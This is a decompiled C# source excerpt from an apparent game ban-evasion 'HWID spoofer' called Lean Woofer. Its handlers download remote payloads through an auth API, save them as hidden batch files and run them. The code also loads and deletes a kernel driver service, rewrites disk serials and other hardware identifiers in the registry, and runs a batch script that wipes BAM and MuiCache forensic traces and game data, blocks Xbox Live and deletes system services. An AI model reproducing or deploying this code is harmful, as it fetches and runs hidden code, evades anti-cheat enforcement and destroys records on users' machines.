		// Token: 0x0600007C RID: 124 RVA: 0x0000843C File Offset: 0x0000663C
		private void bc(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\leanuser.txt"))
			{
				File.Delete("C:\\Program Files\\leanuser.txt");
			}
			if (File.Exists("C:\\Program Files\\leanpass.txt"))
			{
				File.Delete("C:\\Program Files\\leanpass.txt");
			}
			MessageBox.Show("Deleted Saved Logins!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x0600007D RID: 125 RVA: 0x0000223C File Offset: 0x0000043C
		private void bd(object sender, EventArgs e)
		{
			this.ba.BringToFront();
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00008488 File Offset: 0x00006688
		private void be(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("203677");
			File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
			File.SetAttributes(tempPath + this.c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			MessageBox.Show("Spoofed EAC!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00008514 File Offset: 0x00006714
		private void bf(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("061044");
			File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
			File.SetAttributes(tempPath + this.c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			MessageBox.Show("Boosted Your System!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00002198 File Offset: 0x00000398
		private void bg(object sender, EventArgs e)
		{
		}

		// Token: 0x06000081 RID: 129 RVA: 0x00002198 File Offset: 0x00000398
		private void bh(object sender, EventArgs e)
		{
		}

		// Token: 0x06000082 RID: 130 RVA: 0x000085A0 File Offset: 0x000067A0
		public static void NetWoof()
		{
			List<Process> list = new List<Process>();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
				Thread.Sleep(500);
				File.Delete("C:\\Program Files\\Win64\\net.bat");
			}
		}

		// Token: 0x06000083 RID: 131 RVA: 0x0000866C File Offset: 0x0000686C
		public static void HWIDclick()
		{
			string keyName = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
			string text = (string)Registry.GetValue(keyName, "HwProfileGuid", "default");
			string value = string.Concat(new string[]
			{
				"{LeanOnTop-",
				Main.GenID(5),
				"-",
				Main.GenID(5),
				"-",
				Main.GenID(4),
				"-",
				Main.GenID(9),
				"}"
			});
			Registry.SetValue(keyName, "GUID", value);
			Registry.SetValue(keyName, "HwProfileGuid", value);
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00007948 File Offset: 0x00005B48
		public static void XBOXclick()
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00008708 File Offset: 0x00006908
		public static void IDclick()
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
		}

		// Token: 0x06000086 RID: 134 RVA: 0x000076D0 File Offset: 0x000058D0
		public static void PCclick()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x06000087 RID: 135 RVA: 0x0000878C File Offset: 0x0000698C
		public static void Diskclick()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
					{
						string value = Main.RandomId(14);
						string value2 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value2));
						registryKey.SetValue("Identifier", value);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(value));
						registryKey.SetValue("SerialNumber", value2);
					}
				}
			}
		}

		// Token: 0x06000088 RID: 136 RVA: 0x000088BC File Offset: 0x00006ABC
		public static void FiveM()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			if (Directory.Exists(folderPath + "\\DigitalEntitlements"))
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
			}
			Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
			if (Directory.Exists(folderPath2 + "\\CitizenFX"))
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", true);
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00002249 File Offset: 0x00000449
		private static void bi()
		{
			Main.bj("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
			Thread.Sleep(600);
			Main.bj("sc start Win32x64_0");
			Main.bj("sc stop Win32x64_0");
			Main.bj("sc delete Win32x64_0");
			File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
		}

		// Token: 0x0600008A RID: 138 RVA: 0x0000899C File Offset: 0x00006B9C
		private static void bj(string a)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + a)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			process.Close();
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00008A0C File Offset: 0x00006C0C
		private void bk(object sender, EventArgs e)
		{
			try
			{
				if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
				{
					Directory.Delete("C:\\Program Files (x86)\\Blade Group");
					Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
				}
				d d = new d();
				d.b();
			}
			catch
			{
			}
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
				streamWriter.WriteLine(":folderclean");
				streamWriter.WriteLine("call :getDiscordVersion");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("goto :xboxclean");
				streamWriter.WriteLine(": getDiscordVersion");
				streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
				streamWriter.WriteLine("     set 'varLoc =%%a'");
				streamWriter.WriteLine("   goto :d1");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine(":d1");
				streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
				streamWriter.WriteLine("     set 'discordVersion =%%z'");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("goto :EOF");
				streamWriter.WriteLine(": xboxclean");
				streamWriter.WriteLine(" cls");
				streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
				streamWriter.WriteLine("sc stop XblAuthManager");
				streamWriter.WriteLine("sc stop XblGameSave");
				streamWriter.WriteLine("sc stop XboxNetApiSvc");
				streamWriter.WriteLine("sc stop XboxGipSvc");
				streamWriter.WriteLine("sc delete XblAuthManager");
				streamWriter.WriteLine("sc delete XblGameSave");
				streamWriter.WriteLine("sc delete XboxNetApiSvc");
				streamWriter.WriteLine("sc delete XboxGipSvc");
				streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
				streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
				streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
				streamWriter.WriteLine("exit");
				streamWriter.WriteLine("goto :eof");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
